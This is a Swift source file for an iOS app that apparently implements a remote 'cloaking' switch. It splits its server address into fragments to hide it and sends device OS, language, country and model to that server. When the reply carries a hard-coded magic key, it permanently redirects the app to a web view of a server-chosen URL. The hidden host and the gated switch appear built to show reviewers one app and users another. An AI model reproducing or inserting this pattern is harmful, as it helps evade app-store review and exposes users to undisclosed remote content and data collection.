import Foundation
import SwiftUI
import Network
import UIKit
internal import Combine

@MainActor
class WebRequestManager: ObservableObject {
    static let shared = WebRequestManager()
    
    @Published var urlString: String?
    @Published var shouldShowWeb = false
    
    private let userDefaultsKey = "svr_lnk_kv"
    private let keySeparator = "#"
    private let uniqueKey = "GJDFHDFHFDJGSDAGKGHK"
    
    private init() {
        loadSavedURL()
    }
    
    private var baseComponents: [String] {
        ["https://", "wallen-eatery", ".space/", "ios-olg-3/", "server.php"]
    }
    private let paramValue1 = "Bs2675kDjkb5Ga"
    
    func constructURL(test: Bool = false) -> URL? {
        let baseURL = baseComponents.joined()
        let osVersion = UIDevice.current.systemVersion
        let language = Locale.preferredLanguages.first?.components(separatedBy: "-").first ?? "en"
        let country = Locale.current.region?.identifier ?? "US"
        let deviceModel = getDeviceModel()
        
        var components = URLComponents(string: baseURL)
        var queryItems: [URLQueryItem] = [
            URLQueryItem(name: "p", value: paramValue1),
            URLQueryItem(name: "os", value: osVersion),
            URLQueryItem(name: "lng", value: language),
            URLQueryItem(name: "devicemodel", value: deviceModel),
            URLQueryItem(name: "country", value: country)
        ]
        
        if test {
            queryItems.append(URLQueryItem(name: "test", value: "Y"))
        }
        
        components?.queryItems = queryItems
        return components?.url
    }
    
    private func getDeviceModel() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let mirror = Mirror(reflecting: systemInfo.machine)
        return mirror.children.reduce(into: "") { result, element in
            if let value = element.value as? Int8, value != 0 {
                result.append(String(UnicodeScalar(UInt8(value))))
            }
        }
    }
    
    func checkServerResponse(retryCount: Int = 3, test: Bool = false) async {
        if let savedURL = urlString {
            shouldShowWeb = true
            return
        }
        
        guard let url = constructURL(test: test) else {
            print("Failed to construct URL")
            shouldShowWeb = false
            return
        }
        
        for attempt in 1...retryCount {
            do {
                var request = URLRequest(url: url)
                request.httpMethod = "GET"
                request.timeoutInterval = 15
                
                let (data, response) = try await URLSession.shared.data(for: request)
                
                guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
                    throw URLError(.badServerResponse)
                }
                
                guard let responseString = String(data: data, encoding: .utf8) else {
                    throw URLError(.cannotDecodeContentData)
                }
                
                if let extractedURL = extractURL(from: responseString), responseString.starts(with: uniqueKey) {
                    saveURL(extractedURL)
                    urlString = extractedURL
                    shouldShowWeb = true
                    return
                } else {
                    shouldShowWeb = false
                    return
                }
            } catch {
                print("Attempt \(attempt) failed: \(error.localizedDescription)")
                if attempt == retryCount {
                    shouldShowWeb = false
                } else {
                    try? await Task.sleep(nanoseconds: 1_000_000_000)
                }
            }
        }
    }

    
    private func extractURL(from response: String) -> String? {
        let components = response.components(separatedBy: keySeparator)
        guard components.count >= 2 else { return nil }
        let url = components[1].trimmingCharacters(in: .whitespacesAndNewlines)
        return url.isEmpty ? nil : url
    }
    
    private func saveURL(_ url: String) {
        UserDefaults.standard.set(url, forKey: userDefaultsKey)
    }
    
    private func loadSavedURL() {
        if let savedURL = UserDefaults.standard.string(forKey: userDefaultsKey), !savedURL.isEmpty {
            urlString = savedURL
            shouldShowWeb = true
        }
    }
    
    func clearSavedURL() {
        UserDefaults.standard.removeObject(forKey: userDefaultsKey)
        urlString = nil
        shouldShowWeb = false
    }
}
